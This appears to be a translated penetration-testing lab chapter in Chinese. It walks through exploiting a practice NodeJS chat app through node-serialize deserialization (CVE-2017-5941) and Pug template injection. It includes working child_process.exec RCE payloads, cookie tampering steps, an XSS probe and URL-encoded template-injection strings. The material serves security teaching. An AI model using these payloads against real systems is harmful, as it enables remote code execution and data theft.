https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
https://blog.websecurify.com/2014/08/hacking-nodejs-andmongodb.html
https://www.owasp.org/index.php/Testing_for_NoSQL_injection
反序列化攻击
在过去的几年中，通过网络进行的序列化/反序列化攻击变得越来越流行。我们在 BlackHat上看到了许多不同的讨
论，发现了 Jenkins 和 Apache Struts2 等常见应用程序中的关键漏洞，并且正在开发像 ysoserial 这样工具的大量活
跃研究。那么反序列化攻击有什么厉害之处呢？
在我们开始之前，我们需要了解为什么要序列化。序列化数据有很多原因，但最常用于生成值/数据的可存储表示而
不会丢失其类型或结构。序列化将对象转换为字节流，以通过网络传输或存储。通常，转换方法涉及 XML，JSON 或
特定于该语言的序列化方法。
NodeJS 中的反序列化 
很多时候，发现复杂的漏洞需要深入了解应用程序。在我们的场景中，Chat NodeJS 应用程序正在使用易受攻击的
serialize.js 版本 。可以发现这个 Node 库易受攻击，因为 “不受信任的数据被传递到 unserialize() 函数中，攻击者通
过传递一个存在 Immediately Invoked Function Expression(IIFE)的 JavaScript 对象可以引起任意代码执行。”（ htt
ps://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5941 ）
让我们逐步了解攻击的细节，以便更好地了解正在发生的事情。第一，我们查看了 serialize.js 文件并快速搜索
eval（ https://github.com/luin/serialize/search?utf8=%E2%9C%93&q=eval&type= ）。通常，允许用户输入进入
JavaScript eval 语句是坏的消息，因为 eval() 执行原始 JavaScript。如果攻击者能够将 JavaScript 注入此语句，他
们将能够在服务器上执行远程执行代码。
其次，我们需要创建一个序列化的 payload，它将被反序列化，并通过我们的 JavaScript payload
require('child_process').exec('ls') .
{“thp”:“_$$ND_FUNC$$_function (){require(‘child_process’).exec(‘DO SYSTEM COMMANDS HERE’, 
function(error, stdout, stderr) { console.log(stdout) });}()”} 
上面的 JSON 对象将通过以下的请求 (){require('child_process').exec('ls')} 进入 unserialize 函数中的 eval
语句，为我们提供远程代码执行。要注意的最后一部分是结尾括号添加了“()”，因为没有它我们的函数就不会被调
用。第一个发现此漏洞的研究员 Ajin Abraham 发现，使用立即调用的函数表达式或 IIFE（ https://en.wikipedia.or
g/wiki/Immediately-invoked_function_expression ）将允许在创建后执行该函数。有关此漏洞的更多详细信息，请
访问：https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5941 。
在我们的聊天应用程序示例中，我们将查看 cookie 值，该值正在使用此易受攻击的库进行反序列化：
转到 http://chat:3000
代理 burp 中的流量并查看 cookie
识别一个 cookie 名称“donotdecodeme”
将该 Cookie 复制到 Burp Suite Decoder 和 Base64 中进行解码
如前所述，每种语言都有其独特的地方，NodeJS 也不例外。在 Node/Express/Pug 中，你无法直接写入 Web 目
录，但是可以像在 PHP 中一样访问它。必须有一个指向文件夹的指定路径，该文件夹既可写又可访问到公共网络。
创建有效 payload
在开始之前，请记住实验中的所有这些 payload 都可以从这里复制粘贴：http://bit.ly/2qBDrFo
获取原始 payload 并修改你的 shell 执行“'DO SYSTEM COMMANDS HERE”
例：
由于原始 Cookie 已编码，我们必须通过 Burp Decoder/Encoder 对我们的 payload 进行 base64编码 *示例
payload：eyJ0aHAiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7cmVxd
注销，打开Burp拦截，并转发/（home）请求
{"thp":"_$$ND_FUNC$$_function(){require('child_process').exec('DO SYSTEM COMMANDS HERE', 
function(error, stdout, stderr) {console.log(stdout)});}"}
{"thp":"_$$ND_FUNC$$_function(){require('child_process').exec('DO SYSTEM COMMANDS HERE', 
function(error, stdout, stderr) { console.log(stdout) });}()"}
将 cookie 修改为新创建的 Base64 payload
转发流量，因为公用文件夹是/的路由，你应该能够打开浏览器并转到 http://chat:3000/hacked.txt
你现在可以进行远程执行代码！随意对此系统进行后期利用。首先尝试访问 /etc/passwd 。
在 node-serialize 模块的源代码中，我们可以利用函数表达式，这对于使用用户输入执行此操作的任何
JavaScript/NodeJS 应用程序来说都是一个严重的问题。这种糟糕的做法让我们攻陷了这个应用程序。
参考文献：
https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execu
tion/
https://github.com/luin/serialize
https://snyk.io/test/npm/node-serialize?severity=high&severity=medium&severity=low
https://blog.websecurify.com/2017/02/hacking-node-serialize.html
模板引擎攻击——模板注入
模板引擎由于其模块化和简洁的代码与标准 HTML 相比而被更频繁地使用。模板注入是指用户输入直接传递到渲染
模板，允许修改底层模板。这可以在 wiki，WSYWIG 或电子邮件模板中恶意使用。这种情况很少发生在无意中，所
以它经常被误解为只是 XSS。模板注入通常允许攻击者访问底层操作系统以获取远程代码执行。
在下一个示例中，你将通过 Pug 对我们的 NodeJS 应用程序执行模板注入攻击。我们无意中将自己暴露给模板注入，
使用带有用户输入的元重定向，使用模板文字 ${} 直接在 Pug 中呈现。重要的是要注意模板文字允许使用换行符，
这是我们必须破坏段落标记，因为 Pug 是空格和换行符，类似于 Python 。
在 Pug 中，第一个字符或单词表示表示标签或功能的 Pug 关键字。你也可以使用缩进指定多行字符串，如下所示：
p.
这是段落缩进。
这仍然是段落标记的一部分。
以下是 HTML 和 Pug 模板的示例：
上面的示例文本显示了它在 HTML 中的外观以及相应的 Pug Markup 语言的外观。通过模板和字符串插值，我们可
以创建快速，可重用且高效的模板
模板注入示例
聊天应用程序容易受到模板注入攻击。在下面的应用程序中，我们将看看我们是否可以与 Pug 模板系统进行交互。
这通常可以通过检查我们提供的输入参数是否可以处理基本操作来完成。James Kettle 写了一篇关于攻击模板和与底
层模板系统交互的大论文（ http://ubm.io/2ECTYSi ）。
与 Pug 交互：
转到 http://chat:3000 并使用任何有效帐户登录
转到 http://chat:3000/directmessage 并输入用户和评论以及“发送”，接下来，返回 Direct Message 页面并尝
试将 XSS payload 输入到用户参数 
http://chat:3000/ti?user=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&comment
这表明应用程序容易受到 XSS 的攻击，但我们可以与模板系统进行交互吗？
在 Burp 历史记录中，查看服务器请 request/response 的响应 /ti?user= ，并将请求发送到 Burp
Repeater（ctrl+r）
测试基本操作
我们可以通过将它传递给算术字符串来测试模板注入的 XSS 易受攻击参数。如果我们的输入被读取，它将识别它易
受模板注入的影响。这是因为模板（如编码语言）可以轻松支持评估算术运算符。
测试基本操作符：
在 Burp Repeater 中，测试 /ti  上的每个参数以进行模板注入。我们可以通过传递9乘9这样的数学运算来做
到这一点。
我们可以看到它没有用，我们没有得到81，请记住，我们的用户输入包含在段落标记内，所以我们可以假设我
们的 Pug 模板代码看起来像这样：
p Message has been sent to !{user}
利用 Pug 的特点：
正如我们之前所说，Pug 是空格分隔的（类似于 Python），换行符开始一个新的模板输入，这意味着如果我们
可以突破 Pug 中的当前行，我们可以执行新的模板代码。在这种情况下，我们将打破段落标记   ，如上所
示，并执行新的恶意模板代码。为此，我们将不得不使用一些 URL 编码来利用此漏洞（ http://bit.ly/2qxeDiy
）。
让我们逐步完成每个要求以执行模板注入：
首先，我们需要触发一个新行并突破当前模板。这可以使用以下字符完成：
%0a new line
其次，我们可以通过使用“=”符号来利用 Pug 中的算术函数
%3d%编码“=”符号
最后，我们可以输入我们的数学方程式
9*9数学方程式
因此，最终 payload 将如下所示：
[newline]=9*9
URL 编码：
GET /ti?user=%0a%3d9*9&comment=&link=
GET /ti?user=%0a%3d9*9 在响应正文中给出了81。你已在用户参数中发现了模板注入！让我们通过利用
JavaScript 来获取远程代码。
正如你在响应中所看到的，我们在段落标记之外有“81”而不是用户名！这意味着我们能够注入模板。
我们现在知道我们可以进行模板注入，因为我们可以执行简单的计算，但是我们需要看看是否可以执行 shell。要获
得 shell 执行，我们必须找到正确的函数来在 Node/JavaScript 中执行。
首先，我们将识别自身全局对象的根节点，然后继续确定我们可以访问哪些模块和功能。我们希望最终使用
Require 函数导入 child_process.exec  以运行操作系统命令。在 Pug 中，“=”字符允许我们输出 JavaScript
结果。我们将从访问全局根开始：
[new line]=global
使用 Burp 的解码器工具将上述表达式编码为 URL 编码，可以得到：
%0a%3d%20%67%6c%6f%62%61%6c
使用上面的 URL 编码字符串作为用户值并重新发送。
如果在提交前后请求一切顺利，我们将看到 [object global]，这意味着我们可以访问全局对象。
解析全局对象：
让我们通过在全局范围内使用 Pug 迭代器‘each’来查看我们可以访问的对象和属性。记住换行符（%0a）和空格
（%20）：
each val,index in global p=index
URL 编码： %0a%65%61%63%68%20%76%61%6c%2c%69%6e%64%65%78%2
在上面的例子中，我们使用‘each’迭代器，它可以访问一个值，并且如果我们指定了数组或对象，也可以选择访
问索引。我们试图找到我们在全局对象中可以访问的对象，方法或模块。我们的最终目标是找到类
似“require”方法的东西，以允许我们导入 child_process.exec，它允许我们运行系统命令。从现在开始，我们
只是使用反复试验来识别最终会给我们 require 方法的方法或对象。
查找代码执行功能：
从上一个请求中，我们看到了全局中的所有对象以及一个名为“process”的对象。接下来，我们需要识别我们在
global.process 中可以访问的有趣对象：
each val,index in global.process p=index
URL 编码： %0a%65%61%63%68%20%76%61%6c%2c%69%6e%64%65%7
我们从所有可用的方法中选择“process”，因为我们知道它最终会导致‘require’。你可以通过选择不同的迭代方
法来尝试尝试和错误过程：
each val,index in global.process.mainModule p = index
URL 编码： %0a%65%61%63%68%20%76%61%6c%2c%69%6e%64%65%78%2